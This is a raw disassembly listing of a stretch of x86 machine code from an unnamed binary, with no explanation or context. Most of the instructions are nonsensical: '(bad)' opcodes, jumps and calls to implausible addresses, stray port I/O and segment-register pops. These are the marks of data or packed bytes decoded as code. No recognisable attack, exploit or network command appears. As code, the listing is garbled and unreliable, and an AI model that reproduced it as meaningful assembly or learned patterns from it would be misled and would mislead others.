  40eeec:	add    eax,DWORD PTR [esp+esi*2]
  40eeef:	or     al,BYTE PTR es:[ebp+0x1c]
  40eef3:	or     DWORD PTR [edx+0x645b1c28],0xffffffc3
	...
  40ef22:	add    BYTE PTR [edx],ah
  40ef24:	jecxz  0x40ef25
  40ef26:	test   al,0x1f
  40ef28:	pop    ebx
  40ef29:	add    BYTE PTR [edx+0x2c],ah
  40ef2c:	outs   dx,DWORD PTR ds:[esi]
  40ef2d:	mov    bh,bl
  40ef2f:	push   esp
  40ef30:	pop    ss
  40ef31:	clc    
  40ef32:	mov    ecx,0x56fbe6e6
  40ef37:	adc    DWORD PTR [edi-0x7b],ecx
  40ef3a:	sub    esi,eax
  40ef3c:	aad    0x9d
  40ef3e:	jmp    0xbcc44a62
  40ef43:	out    0x6d,eax
  40ef45:	or     eax,0xfe6e3b6d
  40ef4a:	jmp    0xea15062d
  40ef4f:	pop    ds
  40ef50:	pop    ebx
  40ef51:	add    BYTE PTR [esi],ah
  40ef53:	fcom   QWORD PTR [edx+0x5b1fe8ff]
  40ef59:	(bad)  
  40ef5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef5b:	iret   
  40ef5c:	xor    eax,0x961fe900
  40ef61:	inc    esp
  40ef62:	sub    eax,0xe9005b1f
  40ef67:	jmp    0x44de:0x6962f806
  40ef6e:	mov    ch,0x10
  40ef70:	loopne 0x40efb6
  40ef72:	mov    ecx,0xd6010108
  40ef77:	(bad)  [edx-0x2]
  40ef7a:	cmp    eax,DWORD PTR [eax+eiz*2-0x40]
  40ef7e:	cmp    al,0xec
  40ef80:	fnstcw WORD PTR [ebp+ebp*4+0x1f]
  40ef84:	call   0x4159d6
	...
  40efad:	add    BYTE PTR [eax],al
  40efaf:	add    bl,ah
  40efb1:	xchg   bh,bh
  40efb3:	xor    al,0xde
  40efb5:	add    ah,BYTE PTR [edi+0xa]
  40efb8:	pop    edi
  40efb9:	pop    ebx
  40efba:	call   DWORD PTR [esp+ecx*8]
  40efbd:	je     0x40efad
  40efbf:	xor    al,0x20
  40efc1:	pop    ebx
  40efc2:	or     ebp,DWORD PTR [ecx+0x66616c]
  40efc8:	retf   0x57
  40efcb:	add    BYTE PTR [esp+ebp*1-0x38],ch
  40efcf:	jmp    0x40efcb
  40efd1:	fwait
  40efd2:	inc    ebx
  40efd3:	enter  0x58f5,0x0
  40efd7:	add    BYTE PTR [edx+0x1c],al
  40efda:	enter  0xe8ff,0xbc
  40efde:	std    
  40efdf:	jne    0x40ef9e
  40efe1:	nop
  40efe2:	in     al,0xfd
  40efe4:	push   edx
  40efe5:	mov    ds:0x8f1975fd,al
  40efea:	cmp    BYTE PTR [ebp-0x3b],bl
  40efed:	pop    eax
  40efee:	cmp    DWORD PTR [ebp+0xd],0x57
  40eff2:	je     0x40effc
  40eff4:	repnz sbb ebx,eax
  40eff7:	call   0x41256d
  40effc:	xrelease mov DWORD PTR cs:[ebp+0x2d],edx
  40f001:	out    dx,al
  40f002:	adc    bh,bh
  40f004:	test   al,0xa0
  40f006:	std    
  40f007:	push   edx
  40f008:	ins    DWORD PTR es:[edi],dx
  40f009:	out    dx,eax
  40f00a:	push   ebx
  40f00b:	cld    
  40f00c:	out    dx,al
  40f00d:	fs std 
  40f00f:	jne    0x40f082
  40f011:	mov    ds:0x850,eax
	...
  40f03a:	add    BYTE PTR [eax],al
  40f03c:	add    BYTE PTR [edx*4-0x11e7fffe],bh
  40f043:	jmp    0x3083:0x54787983
  40f04a:	into   
  40f04b:	popa   
  40f04c:	inc    ecx
  40f04d:	xor    eax,0x8a1e7558
  40f052:	ins    DWORD PTR es:[edi],dx
  40f053:	test   eax,0x1570463
  40f058:	add    BYTE PTR ds:0xd6afbe58,dh
  40f05e:	pop    ss
  40f05f:	add    bl,ch
  40f061:	or     bh,dl
  40f063:	shl    BYTE PTR [esi],0x7
  40f066:	xlat   BYTE PTR ds:[ebx]
  40f067:	les    eax,FWORD PTR [edx]
  40f069:	sbb    al,0x5c
  40f06b:	test   DWORD PTR ds:0x82d5471c,edi
  40f071:	cmp    ebp,edi
  40f073:	cmp    eax,DWORD PTR [ecx+0x1c]
  40f076:	xor    bh,0x83
  40f079:	out    0x81,eax
  40f07b:	add    al,BYTE PTR [eax]
  40f07d:	lahf   
  40f07e:	mov    esi,0x825d4a83
  40f083:	add    cl,BYTE PTR [edi]
  40f085:	cwde   
  40f086:	sbb    eax,DWORD PTR [ebx]
  40f088:	add    BYTE PTR [ecx+eax*1],bl
  40f08b:	push   es
  40f08c:	mov    ebx,0x2c357
  40f091:	sub    edi,esi
  40f093:	loope  0x40f094
  40f095:	mov    bl,0x81
  40f097:	mov    edi,0x281a844
  40f09c:	add    BYTE PTR [esi*1+0xf83e],bl
	...
  40f0c7:	add    BYTE PTR [eax],al
  40f0c9:	add    BYTE PTR [edx+eax*4],bl
  40f0cc:	add    al,BYTE PTR [eax]
  40f0ce:	mov    eax,ds:0x994fc6b6
  40f0d3:	mov    esi,0x81f64fca
  40f0d8:	pop    edx
  40f0d9:	stc    
  40f0da:	inc    edx
  40f0dc:	add    bh,bh
  40f0de:	or     DWORD PTR [ecx],eax
  40f0e0:	cmp    al,0x41
  40f0e2:	sbb    al,0x79
  40f0e4:	ret    0x980e
  40f0e7:	and    eax,DWORD PTR [ebx]
  40f0e9:	add    BYTE PTR [ecx+eax*1],bl
  40f0ec:	dec    ecx
  40f0ed:	clc    
  40f0ee:	sbb    al,0x7d
  40f0f0:	jle    0x40f09d
  40f0f2:	sbb    al,0x82
  40f0f4:	add    al,BYTE PTR [ebx+0xf039dc1]
  40f0fa:	mov    al,ds:0x1c0003df
  40f0ff:	jmp    0xff76ed54
  40f104:	add    eax,DWORD PTR [eax]
  40f106:	sbb    al,0x44
  40f108:	jnp    0x40f13f
  40f10a:	sbb    ebx,DWORD PTR [edi+ebx*1-0x14]
  40f10e:	mov    ds:0x91c79920,al
  40f113:	inc    edi
  40f114:	inc    cx
  40f116:	or     ah,dh
  40f118:	cmp    eax,0x915b5d63
  40f11d:	in     eax,dx
  40f11e:	push   edi
  40f11f:	pop    ebx
  40f120:	jmp    0xa91fbcd9
  40f125:	add    dl,BYTE PTR [ebp-0x74a376e0]
  40f12b:	(bad)  
  40f12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f12d:	add    eax,DWORD PTR [eax]
	...
  40f157:	mov    ds:0x60bf4520,eax
  40f15c:	ja     0x40f146
  40f15e:	add    ebx,DWORD PTR [ebx+ebx*2]
  40f161:	pop    esp
  40f162:	inc    ecx
  40f163:	les    ecx,FWORD PTR [ebx]
  40f165:	rol    DWORD PTR [esi+eax*2],cl
  40f168:	pop    ebx
  40f169:	rol    DWORD PTR [ebx],cl
  40f16b:	cdq    
  40f16c:	and    BYTE PTR [ecx+0x34],cl
  40f16f:	ss pop ebx
  40f171:	pop    esp
  40f172:	inc    ecx
  40f173:	mov    WORD PTR [ebx],cs
  40f175:	es icebp 
  40f177:	(bad)  
  40f178:	push   ss
  40f179:	test   al,0x3
  40f17b:	pop    ss
  40f17c:	fwait
  40f17d:	pushf  
  40f17e:	sbb    BYTE PTR [edi-0xffc0318],bl
  40f184:	inc    ecx
  40f185:	inc    ecx
  40f186:	add    eax,0xfae95b1c
  40f18b:	stos   DWORD PTR es:[edi],eax
  40f18c:	out    dx,eax
  40f18d:	faddp  st(6),st
  40f18f:	call   0x4491dfe6
  40f194:	push   0x5b
  40f196:	fcom   DWORD PTR [edx-0xf]
  40f199:	lock pop ebx
  40f19b:	and    BYTE PTR [ebx-0x3a],bl
  40f19e:	test   DWORD PTR [ebx],edi
  40f1a0:	mov    al,0xd2
  40f1a2:	(bad)  
  40f1a3:	cmp    ch,BYTE PTR [edx+0x3b]
  40f1a6:	fdivr  DWORD PTR [ebx]
  40f1a8:	test   BYTE PTR [edx],ah
  40f1aa:	add    al,0x1c
  40f1ac:	or     DWORD PTR [eax],eax
  40f1ae:	mov    dh,0xe4
  40f1b0:	bound  eax,QWORD PTR [edx+0x7cdd1ba7]
  40f1b6:	mov    eax,ds:0x6a08ef1f
	...
  40f1e3:	add    BYTE PTR [ecx],ah
  40f1e5:	pop    ebx
  40f1e6:	(bad)  
  40f1e8:	push   0x6a
  40f1ea:	dec    BYTE PTR [esi-0x7904111e]
  40f1f0:	in     al,dx
  40f1f1:	loopne 0x40f23d
  40f1f3:	sub    BYTE PTR [eax],ah
  40f1f5:	or     ecx,ecx
  40f1f7:	stos   DWORD PTR es:[edi],eax
  40f1f8:	jecxz  0x40f263
  40f1fa:	push   ebx
  40f1fb:	(bad)
  40f200:	jne    0x40f25d
  40f202:	push   0xe
  40f204:	jecxz  0x40f1f4
  40f206:	pop    es
  40f207:	inc    ecx
  40f208:	out    dx,al
  40f209:	cmc    
  40f20a:	dec    BYTE PTR [esi+0x38]
  40f20d:	pop    ds
  40f20e:	cld    
  40f20f:	push   0x24
  40f211:	mov    cs,WORD PTR [edx-0x58]
  40f214:	pop    ds
  40f215:	pop    ebx
  40f216:	je     0x40f20e
  40f218:	bound  ebx,QWORD PTR [esi]
  40f21a:	clc    
  40f21b:	jmp    0xd2414d3f
  40f220:	pop    edi
  40f221:	sbb    DWORD PTR [eax-0x47],edx
  40f224:	add    al,0xf
  40f226:	clc    
  40f227:	mov    ebx,0xa2d34e5a
  40f22c:	loopne 0x40f288
  40f22e:	test   DWORD PTR [ecx],ebp
  40f230:	loopne 0x40f28e
  40f232:	jmp    0x40f1fe
  40f234:	sahf   
  40f235:	out    0xf7,al
  40f237:	jmp    0xd32c4f08
  40f23c:	test   ebx,0x6a1829a2
  40f242:	je     0x40f225
  40f244:	popa   
  40f245:	out    dx,al
  40f246:	pop    es
  40f247:	rol    DWORD PTR [eax],0x0
	...
  40f26e:	add    BYTE PTR [eax],al
  40f270:	add    ch,ch
  40f272:	arpl   si,di
  40f274:	into   
  40f275:	mov    ch,0xe
  40f277:	clc    
  40f278:	add    BYTE PTR [esi+0x5d75fd6c],ch
  40f27e:	lahf   
  40f27f:	push   eax
  40f280:	or     BYTE PTR [edx+0x19],ch
  40f283:	or     al,ch
  40f285:	push   edx
  40f286:	mov    al,ds:0x18bafffd
  40f28b:	or     al,ch
  40f28d:	pop    ebp
  40f28e:	mov    eax,ds:0x18aafffd
  40f293:	cld    
  40f294:	call   DWORD PTR [eax]
  40f296:	addr16 out 0xd3,al
  40f299:	or     DWORD PTR [esi+0x5bb7c9fd],ebx
  40f29f:	add    BYTE PTR [ebp+0x7e],dl
  40f2a2:	add    DWORD PTR [ecx+0x573955c4],0x53
  40f2a9:	dec    esi
  40f2aa:	cmp    BYTE PTR [edi+eax*8],cl
  40f2ad:	mov    bh,0x5c
  40f2af:	add    BYTE PTR [eax],al
  40f2b1:	mov    ch,0x9f
  40f2b3:	jae    0x40f2bd
  40f2b5:	pop    ebp
  40f2b6:	jo     0x40f310
  40f2b8:	add    ch,al
  40f2ba:	fcomi  st,st(6)
  40f2bc:	add    DWORD PTR [edx+0x65],esi
  40f2bf:	sub    eax,eax
  40f2c1:	mov    ?,WORD PTR [edi]
  40f2c3:	pop    esi
  40f2c4:	leave  
  40f2c5:	inc    edi
  40f2c6:	addr16 (bad) 
  40f2c8:	shr    BYTE PTR ds:0xc0c53e2,1
  40f2ce:	pop    ebp
  40f2cf:	mov    ebx,eax
  40f2d1:	jp     0x40f2ad
  40f2d3:	fadd   DWORD PTR [eax]
	...
  40f2fd:	add    BYTE PTR [ebp+0x6d758b5c],al
  40f303:	jecxz  0x40f380
  40f305:	or     BYTE PTR [esi],cl
  40f307:	xor    eax,0xdc738b66
  40f30c:	cli    
  40f30d:	xor    bh,dl
  40f30f:	popa   
  40f310:	jle    0x40f30e
  40f312:	cld    
  40f313:	adc    eax,0x4c598005
  40f318:	jmp    0x40f335
  40f31a:	sbb    al,0xf2
  40f31c:	mov    BYTE PTR [eax-0x52],0x86
  40f320:	cmp    bl,0xda
  40f323:	sub    ah,bh
  40f325:	jg     0x40f35f
  40f327:	xor    eax,DWORD PTR [ebx+eax*8+0x2af99d16]
  40f32e:	fmul   QWORD PTR [ebp+eiz*1+0x5e]
  40f332:	in     eax,0xb3
  40f334:	cli    
  40f335:	inc    DWORD PTR [edi-0x7e]
  40f338:	push   eax
  40f339:	or     BYTE PTR [eax-0x75],al
  40f33c:	dec    ebx
  40f33d:	add    al,0x48
  40f33f:	adc    bh,0x16
  40f342:	xor    BYTE PTR [ebx],dh
  40f344:	push   edx
  40f345:	or     ch,BYTE PTR [eax]
  40f347:	inc    eax
  40f348:	dec    ebp
  40f349:	push   es
  40f34a:	xor    BYTE PTR [ebx],dh
  40f34c:	add    BYTE PTR [edx],cl
  40f34e:	(bad)  
  40f34f:	jp     0x40f368
  40f351:	shl    BYTE PTR [edi-0x5f],0x24
  40f355:	leave  
  40f356:	fisubr WORD PTR [ecx+0x2]
  40f359:	sar    BYTE PTR [ebp+esi*2-0x43793c08],0x7f
  40f361:	lds    eax,FWORD PTR [eax]
	...
  40f38b:	push   ds
  40f38c:	ins    DWORD PTR es:[edi],dx
  40f38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f38e:	je     0x40f40e
  40f390:	in     al,dx
  40f391:	cmp    eax,0x7361a30c
  40f396:	inc    esp
  40f397:	xchg   esp,eax
  40f398:	cmp    BYTE PTR [esi+0x8],cl
  40f39b:	mov    ds:0xe1c6c6b6,eax
  40f3a0:	dec    ebp
  40f3a1:	add    eax,DWORD PTR [eax]
  40f3a3:	sbb    al,0x72
  40f3a5:	jg     0x40f3e3
  40f3a7:	mov    bh,0xbc
  40f3a9:	inc    ecx
  40f3aa:	add    BYTE PTR [esi+eiz*8],bl
  40f3ad:	sub    al,0x8d
  40f3af:	loope  0x40f412
  40f3b1:	xor    DWORD PTR [edx+0x1d],ebp
  40f3b4:	fadd   QWORD PTR [edx]
  40f3b6:	push   0x1c
  40f3b8:	fadd   QWORD PTR [edx]
  40f3ba:	push   0x1c
  40f3bc:	pop    ebx
  40f3bd:	je     0x40f408
  40f3bf:	inc    esp
  40f3c0:	or     bl,dh
  40f3c2:	sbb    DWORD PTR [edi+0x27042813],eax
  40f3c8:	fwait
  40f3c9:	push   esp
  40f3ca:	(bad)  
  40f3cb:	sahf   
  40f3cc:	in     eax,0xbc
  40f3ce:	add    al,0xb0
  40f3d0:	cs jb  0x40f41c
  40f3d3:	adc    ah,dl
  40f3d5:	and    esi,DWORD PTR [esi+edx*2+0x17ee3653]
  40f3dc:	rcr    DWORD PTR [ebx],cl
  40f3de:	mov    eax,0x8ef0e896
  40f3e3:	push   eax
  40f3e4:	imul   ecx,DWORD PTR [ecx+0x61bfef06],0x49
  40f3eb:	and    BYTE PTR [esi-0x5],ah
  40f3ee:	mov    bl,0x0
	...
  40f418:	call   0xbc73:0xe8397e5b
  40f41f:	pop    esp
  40f420:	sbb    al,0x5b
  40f422:	xor    DWORD PTR ds:0x5ee95b1c,eax
  40f428:	imul   eax,DWORD PTR ds:0x5b1bc630,0x2
  40f42f:	les    edx,FWORD PTR [esi+0x6]
  40f432:	scas   eax,DWORD PTR es:[edi]
  40f433:	int3   
  40f434:	fst    QWORD PTR [ebx-0x17]
  40f437:	pop    eax
  40f438:	xchg   edi,eax
  40f439:	ja     0x40f4a4
  40f43b:	enter  0xf363,0xe8
  40f43f:	jecxz  0x40f3dc
  40f441:	inc    ax
  40f443:	add    al,BYTE PTR [edx]
  40f445:	and    ax,0xe08d
  40f449:	xchg   ax,ax
  40f44b:	add    edi,DWORD PTR [ebx+ebx*2]
  40f44e:	jmp    0xe3620fe
  40f453:	ret    
  40f454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f455:	and    BYTE PTR [ecx],al
  40f457:	sub    al,0x1c
  40f459:	cmp    ebp,ecx
  40f45b:	add    esi,DWORD PTR [edi+edi*1+0x0]
  40f45f:	xchg   DWORD PTR [esi+0x65],ebx
  40f462:	mov    BYTE PTR [ebx+ecx*4+0x2008fffe],ah
  40f469:	pop    ebx
  40f46a:	call   0xfea70265
  40f46f:	pusha  
  40f470:	in     al,0x6a
  40f472:	addr16 jmp 0xd23f5ab7
  40f478:	sbb    ebp,esi
  40f47a:	(bad)  
  40f47b:	mov    esi,0x0
	...
  40f4a4:	add    BYTE PTR [eax+0x2041ec1f],dl
  40f4aa:	cmp    eax,DWORD PTR [eax]
  40f4ac:	jmp    0xa6ad5b78
  40f4b1:	(bad)  
  40f4b3:	inc    esp
  40f4b4:	xchg   ecx,eax
  40f4b5:	aaa    
  40f4b6:	pop    ebx
  40f4b7:	and    cl,ch
  40f4b9:	pop    ds
  40f4ba:	jae    0x40f4ab
  40f4bc:	cld    
  40f4bd:	fisub  WORD PTR [eax+ecx*4+0x2c]
  40f4c1:	mov    ah,0x64
  40f4c3:	je     0x40f49e
  40f4c5:	aaa    
  40f4c6:	sub    eax,0x66202864
  40f4cb:	je     0x40f53a
  40f4cd:	xchg   DWORD PTR [ebp-0x25e016a8],eax
  40f4d3:	ret    
  40f4d4:	in     eax,dx
  40f4d5:	fsubp  st(6),st
  40f4d7:	xadd   DWORD PTR [eax-0x1],ebp
  40f4db:	inc    eax
  40f4dc:	jmp    0x5238e3bf
  40f4e1:	int3   
  40f4e2:	add    al,BYTE PTR [eax]
  40f4e4:	jmp    0x364c8e83
  40f4e9:	push   esp
  40f4ea:	dec    ebx
  40f4eb:	push   0x1c3b8f
  40f4f0:	es inc esp
  40f4f2:	outs   dx,DWORD PTR ds:[esi]
  40f4f3:	out    0x63,eax
  40f4f5:	loopne 0x40f551
  40f4f7:	add    BYTE PTR [edx+0x63],ch
  40f4fa:	push   ecx
  40f4fb:	call   DWORD PTR [edi+ecx*1-0x66ff830d]
  40f502:	push   ds
  40f503:	add    bh,bh
  40f505:	call   0xe8dbb3
	...
  40f532:	lods   al,BYTE PTR ds:[esi]
  40f533:	pop    ecx
  40f534:	add    BYTE PTR [ebx+0x75ff55f9],al
  40f53a:	inc    ebp
  40f53b:	xor    DWORD PTR [eax-0xa10b9c],edx
  40f541:	jne    0x40f5a4
  40f543:	mov    dh,0x92
  40f545:	pop    ecx
  40f546:	inc    ebp
  40f547:	pop    ecx
  40f548:	add    esp,0x31
  40f54b:	call   0x4162:0xf0cd0c73
  40f552:	add    eax,0xdde8739c
  40f557:	fcom   DWORD PTR [edi+0x0]
  40f55a:	cmc    
  40f55b:	ffreep st(2)
  40f55d:	or     al,0xa2
  40f55f:	sub    al,0x10
  40f561:	push   0x413357
  40f566:	mov    ds:0x13e8e42c,al
  40f56b:	add    BYTE PTR [eax],al
  40f56d:	add    BYTE PTR [esi-0x6d],dh
  40f570:	or     ch,BYTE PTR [edx-0x3b]
  40f573:	fwait
  40f574:	jae    0x40f572
  40f576:	inc    edx
  40f577:	sub    al,0xc
  40f579:	jmp    FWORD PTR [eax]
  40f57b:	mov    eax,0xb0b54146
  40f580:	push   esp
  40f581:	jo     0x40f5d5
  40f583:	call   0xff00:0x35654587
  40f58a:	push   0xb175fda0
  40f58f:	fwait
  40f590:	xor    esp,ecx
  40f592:	mov    ebp,0xe80019
	...
  40f5bf:	lds    ebp,FWORD PTR [eax]
  40f5c1:	(bad)  
  40f5c2:	dec    DWORD PTR [esp+ebx*1]
  40f5c5:	fsubr  QWORD PTR [edx+0x75]
  40f5c8:	fwait
  40f5c9:	jae    0x40f5bf
  40f5cb:	sbb    al,0x4d
  40f5cd:	aaa    
  40f5ce:	or     al,0x73
  40f5d0:	(bad)  
  40f5d1:	mov    eax,ds:0xaa71dd47
  40f5d6:	sub    esp,ebp
  40f5d8:	fs mov edi,0x2e49e188
  40f5de:	add    BYTE PTR [ebx-0x11],dl
  40f5e1:	mov    dl,0xfe
  40f5e3:	ror    DWORD PTR [ecx+0x2a3d34bf],1
  40f5e9:	inc    ebx
  40f5ea:	add    BYTE PTR [esi+eiz*2+0x32],al
  40f5ee:	push   DWORD PTR [ebx]
  40f5f0:	sti    
  40f5f1:	inc    ebp
  40f5f2:	aam    0xb6
  40f5f4:	jno    0x40f5b5
  40f5f6:	je     0x40f628
  40f5f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f9:	xor    eax,0xa1671be8
  40f5fe:	inc    edi
  40f5ff:	pop    ebp
  40f600:	jb     0x40f5ac
  40f602:	std    
  40f603:	jnp    0x40f5c2
  40f605:	mov    edi,0x8da25988
  40f60a:	inc    esp
  40f60b:	fsub   QWORD PTR [ecx]
  40f60d:	shl    DWORD PTR [eax+edi*8-0x2c],0x35
  40f612:	or     al,0xeb
  40f614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f615:	mov    eax,ds:0xaa725d47
  40f61a:	in     eax,0x4b
  40f61c:	in     eax,dx
  40f61d:	mov    edi,0x83c65988
  40f622:	jl     0x40f624
	...
  40f64c:	mov    esp,0x8b840f71
  40f651:	jno    0x40f655
  40f653:	add    BYTE PTR [edi+0x22ffd68e],bl
  40f659:	(bad)  
  40f65a:	ins    DWORD PTR es:[edi],dx
  40f65b:	jmp    FWORD PTR [ebx-0x33837c8f]
  40f661:	jno    0x40f672
  40f663:	test   BYTE PTR [edi-0x5efffd8f],bh
  40f669:	mov    esi,0x5a8b4fc6
  40f66e:	pushf  
  40f66f:	xlat   BYTE PTR ds:[ebx]
  40f670:	jnp    0x40f67c
  40f672:	sbb    al,0xc0
  40f674:	jp     0x40f6c5
  40f676:	sub    DWORD PTR [eax],edx
  40f678:	cwde   
  40f679:	shr    eax,cl
  40f67b:	add    ebx,DWORD PTR [eax+ebx*8]
  40f67e:	add    edi,0x63
  40f681:	push   esp
  40f682:	xchg   BYTE PTR gs:[ebx+0x63],bl
  40f686:	call   0x98d3cf19
  40f68b:	rcl    al,0x8a
  40f68e:	shl    dl,1
  40f690:	inc    eax
  40f691:	arpl   bp,bx
  40f693:	or     ebx,DWORD PTR [esi+ebp*8+0x5b]
  40f697:	xor    DWORD PTR [eax-0x44c8176e],0xfffffff2
  40f69e:	fadd   DWORD PTR [ebx]
  40f6a0:	xor    esp,DWORD PTR [ebp+edi*4-0x2c8cdbc7]
  40f6a7:	sub    al,0x13
  40f6a9:	arpl   WORD PTR [ebp+0x1b62fc39],bp
  40f6af:	or     al,0x0
	...
  40f6d9:	hlt    
  40f6da:	out    0xf,eax
  40f6dc:	mov    edi,0xe01b62fa
  40f6e1:	bnd call 0xf4b5a2c7
  40f6e7:	test   DWORD PTR [edi-0x405f171e],edi
  40f6ed:	push   eax
  40f6ee:	push   ebx
  40f6ef:	sbb    DWORD PTR [esi+0x45],0x50bf6d62
  40f6f6:	xchg   edi,eax
  40f6f7:	gs cmp eax,ebp
  40f6fa:	(bad)  
  40f6fc:	or     eax,esp
  40f6fe:	aaa    
  40f6ff:	sar    BYTE PTR [esi-0x342c9d4e],0xaa
  40f706:	call   0x5369b623
  40f70b:	push   ecx
  40f70c:	push   ss
  40f70d:	add    eax,0x9f35ff62
  40f712:	(bad)  
  40f714:	jmp    0xa4c43f6c
  40f719:	pop    edi
  40f71a:	pop    esi
  40f71b:	jne    0x40f70b
  40f71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71e:	pop    ss
  40f71f:	int3   
  40f720:	push   ss
  40f721:	push   0xb7e17461
  40f726:	cdq    
  40f727:	addr16 push es
  40f729:	mov    ds:0x1f930975,eax
  40f72e:	bound  esi,QWORD PTR [ecx+eiz*8-0x79]
  40f732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f733:	addr16 out dx,al
  40f735:	mov    ah,BYTE PTR [ecx+0x74]
  40f738:	in     eax,0x77
  40f73a:	pop    esp
  40f73b:	ins    BYTE PTR es:[edi],dx
  40f73c:	fiadd  WORD PTR [eax]
	...
  40f766:	jp     0x40f7c9
  40f768:	je     0x40f73b
  40f76a:	xchg   DWORD PTR [edx+ebp*2-0x32],esp
  40f76e:	push   0x61
  40f770:	je     0x40f72f
  40f772:	ja     0x40f7e0
  40f774:	push   0xffffffbe
  40f776:	fisub  DWORD PTR [eax+0x74]
  40f779:	mov    ecx,0xae6a73c7
  40f77e:	retf   0x7460
  40f781:	xchg   ebp,eax
  40f782:	mov    bh,0x7b
  40f784:	push   0xffffff9e
  40f786:	mov    edx,0xc7817460
  40f78b:	sub    DWORD PTR [edx-0x72],0xffffffaa
  40f78f:	pusha  
  40f790:	je     0x40f71f
  40f792:	mov    bh,0x8b
  40f794:	push   0x7e
  40f796:	call   0x6a93:0x87897460
  40f79d:	outs   dx,BYTE PTR ds:[esi]
  40f79e:	mov    ah,BYTE PTR [eax+0x74]
  40f7a1:	inc    ebp
  40f7a2:	ja     0x40f73f
  40f7a4:	push   0x5e
  40f7a6:	jp     0x40f808
  40f7a8:	je     0x40f7db
  40f7aa:	xchg   DWORD PTR [ebx+0x606a4e6a],esp
  40f7b0:	je     0x40f7b2
  40f7b2:	add    DWORD PTR [esi-0x5ea59450],esi
  40f7b8:	std    
  40f7b9:	jne    0x40f7f0
  40f7bb:	mov    dh,0xa8
  40f7bd:	imul   edi,DWORD PTR [edx],0xffffffa1
  40f7c0:	std    
  40f7c1:	jne    0x40f80c
  40f7c3:	mov    dh,0xa0
  40f7c5:	imul   ebx,DWORD PTR [edx],0xffffffa1
  40f7c8:	mov    edx,0x0
	...
  40f7f2:	add    BYTE PTR [ecx+0x5d],bh
  40f7f5:	push   ebp
  40f7f6:	mov    ebp,DWORD PTR [ecx-0x23]
  40f7f9:	ret    0x62e8
  40f7fc:	lahf   
  40f7fd:	std    
  40f7fe:	lea    eax,[eax-0x2f00b15f]
  40f804:	push   ecx
  40f805:	push   DWORD PTR ds:0x411614
  40f80b:	ins    DWORD PTR es:[edi],dx
  40f80c:	jmp    0x5285f866
  40f811:	ror    BYTE PTR [edi],0xc0
  40f814:	inc    edx
  40f815:	add    DWORD PTR [eax],eax
  40f817:	xor    eax,0x35f84396
  40f81c:	pop    ebp
  40f81d:	add    BYTE PTR [eax],al
  40f81f:	ret    0xf418
  40f822:	inc    DWORD PTR [edx]
  40f824:	pop    ebp
  40f825:	add    BYTE PTR [edx-0xb],ch
  40f828:	xor    al,BYTE PTR [eax]
  40f82a:	push   0xfffffff5
  40f82c:	xor    al,BYTE PTR [eax]
  40f82e:	lea    eax,[eax-0x5d]
  40f831:	dec    esi
  40f832:	lea    eax,[eax-0x65000a59]
  40f838:	pop    es
  40f839:	push   DWORD PTR [ebp-0x63]
  40f83c:	sahf   
  40f83d:	jae    0x40f83b
  40f83f:	lods   eax,DWORD PTR ds:[esi]
  40f840:	(bad)  
  40f841:	push   ebp
  40f842:	add    ch,al
  40f844:	push   ebx
  40f845:	shl    BYTE PTR [eax+eax*8-0x4b],0xd5
  40f84a:	add    BYTE PTR [ebp+0x6dbd685c],dh
  40f850:	sbb    eax,0x7f1cff00
  40f855:	push   cs
  40f856:	call   0x40f85b
	...
  40f87f:	add    ah,al
  40f881:	mov    al,ds:0xed4cfebb
  40f886:	ror    DWORD PTR [ecx+eiz*4-0x6c014ade],cl
  40f88d:	ret    0xe850
  40f890:	push   esp
  40f891:	mov    al,ds:0xef95febb
  40f896:	stos   DWORD PTR es:[edi],eax
  40f897:	idiv   BYTE PTR [ebx+0x41]
  40f89a:	lods   al,BYTE PTR ds:[esi]
  40f89b:	sbb    eax,0x8cbd4907
  40f8a0:	loope  0x40f8e3
  40f8a2:	push   esp
  40f8a3:	push   0x41ce36
  40f8a8:	pop    ebx
  40f8a9:	daa    
  40f8aa:	lods   al,BYTE PTR ds:[esi]
  40f8ab:	not    BYTE PTR [ebx+0x69]
  40f8ae:	mov    ebx,0x41ba3d34
  40f8b3:	add    BYTE PTR [esi+edx*2],dh
  40f8b6:	cs (bad) 
  40f8b8:	cmp    ebp,ebx
  40f8ba:	test   ebx,ebp
  40f8bc:	sub    ecx,DWORD PTR [ecx-0x61967d45]
  40f8c2:	mov    bl,0xfe
  40f8c4:	and    esi,DWORD PTR [edx+0x36]
  40f8c7:	pop    edx
  40f8c8:	lahf   
  40f8c9:	push   ds
  40f8ca:	mov    ah,0x3
  40f8cc:	mov    DWORD PTR [ebx],edi
  40f8ce:	mov    DWORD PTR [eax+edi*8+0x3febba8],eax
  40f8d5:	or     BYTE PTR [ebx-0x4436f77c],0xfe
  40f8dc:	popf   
  40f8dd:	push   es
  40f8de:	scas   eax,DWORD PTR es:[edi]
  40f8df:	imul   bl
  40f8e1:	shr    BYTE PTR [edx+0x2],1
	...
  40f90b:	add    BYTE PTR [eax],al
  40f90d:	sbb    al,0x72
  40f90f:	xor    al,0xa
  40f911:	jecxz  0x40f909
  40f913:	scas   al,BYTE PTR es:[edi]
  40f914:	not    bl
  40f916:	call   0x725cfbc5
  40f91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f91c:	sbb    ebx,eax
  40f91e:	pop    edx
  40f91f:	je     0x40f8d0
  40f921:	mov    dl,0x5f
  40f923:	pop    ebp
  40f924:	mov    esp,0xbc5d6e68
  40f929:	stos   BYTE PTR es:[edi],al
  40f92a:	pop    edi
  40f92b:	xchg   ebx,eax
  40f92c:	stos   DWORD PTR es:[edi],eax
  40f92d:	stos   BYTE PTR es:[edi],al
  40f92e:	pop    edi
  40f92f:	inc    ebp
  40f930:	mov    esp,0x3b515310
  40f935:	nop
  40f936:	pop    edi
  40f937:	xor    eax,0x356ec880
  40f93c:	mov    esp,0xde9c5a82
  40f941:	jp     0x40f8e8
  40f943:	or     al,0xb4
  40f945:	jb     0x40f9a6
  40f947:	add    BYTE PTR [eax-0x43f2a00b],bl
  40f94d:	test   al,0x6e
  40f94f:	std    
  40f950:	mov    ebx,0x2958725a
  40f955:	push   ebx
  40f956:	pop    edi
